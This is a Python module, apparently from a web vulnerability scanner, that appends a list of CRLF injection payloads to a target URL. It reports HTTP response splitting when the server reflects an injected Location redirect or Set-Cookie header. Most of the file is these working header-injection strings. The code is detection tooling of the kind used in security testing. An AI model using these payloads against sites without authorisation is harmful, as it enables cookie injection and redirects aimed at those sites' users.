from core.others import good,bad,info,requester,proxies,requests
http_redirect_codes = [i for i in range(300,311,1)]

payloads = [
            "%0d%0aLocation:www.google.com%0d%0a",
            "%0d%0aSet-Cookie:name=ch33ms;",
            r"\r\n\tSet-Cookie:name=ch33ms;",
            r"\r\tSet-Cookie:name=ch33ms;",
            "%E5%98%8A%E5%98%8DLocation:www.google.com",
            r"\rSet-Cookie:name=ch33ms;",
            r"\r%20Set-Cookie:name=ch33ms;",
            r"\r\nSet-Cookie:name=ch33ms;",
            r"\r\n%20Set-Cookie:name=ch33ms;",
            r"\rSet-Cookie:name=ch33ms;",
            "%u000ASet-Cookie:name=ch33ms;",
            r"\r%20Set-Cookie:name=ch33ms;",
            "%23%0D%0ALocation:www.google.com;",
            r"\r\nSet-Cookie:name=ch33ms;",
            r"\r\n%20Set-Cookie:name=ch33ms;",
            r"\r\n\tSet-Cookie:name=ch33ms;",
            r"\r\tSet-Cookie:name=ch33ms;",
            "%5cr%5cnLocation:www.google.com",
            "%E5%98%8A%E5%98%8D%0D%0ASet-Cookie:name=ch33ms;",
            r"\r\n Header-Test:BLATRUC",
            r"\rSet-Cookie:name=ch33ms;",
            r"\r%20Set-Cookie:name=ch33ms;",
            r"\r\nSet-Cookie:name=ch33ms;",
            r"\r\n%20Set-Cookie:name=ch33ms;",
            r"\r\n\tSet-Cookie:name=ch33ms;",
            r"\r\tSet-Cookie:name=ch33ms;"
            ]

#---------------------------------------------------------------------#
def CrlfScan(url,foxy):

    print("%s Checking for CRLF Injection" % info)

    parameter = '=' in url
    if parameter:
        if url.endswith('=')==False:
            print("%s Omit the value of parameter that you wanna fuzz" % info)
            exit()
    elif parameter==False:
        print('%s Appending payloads just after the URL' % info)
        if url.endswith('/')==True:
            pass
        elif url.endswith('/')==False:
            url = url+'/'
    
    for payload in payloads:
        try: 
            page = requester("%s%s" % (url,payload),foxy)

        except requests.exceptions.Timeout:
            print("[\033[91mTimeout\033[00m] %s" % url)
            break

        except requests.exceptions.ConnectionError:
            print("%s Connection Error" % bad)
            break

        except requests.exceptions.InvalidURL:
            print("%s Invalid URL structure" % bad)
            break
#-----------------------------------------------------------------------#
        if page.status_code==404:
            print("[\033[91m404\033[00m] %s%s" % (url,payload))
        
        elif page.status_code==403:
            print("[\033[91m403\033[00m] %s%s" % (url,payload))
        
        elif page.status_code==400:
            print("[\033[91m400\033[00m] %s%s" % (url,payload))
#------------------------------------------------------------------------#
        if 'Location' in payload:
            if page.status_code in http_redirect_codes and page.headers['Location'] == "www.google.com":
                print("%s HTTP Response Splitting found: \033[1m%s\033[00m" % (good, payload))

        elif "Set-Cookie" in payload:
            if page.status_code != 404:
                try:
                    if page.headers['Set-Cookie'] == "name=ch33ms;":
                        print("%s HTTP Response Splitting found: \033[1m%s\033[00m" % (good, payload))

                except KeyError:
                    break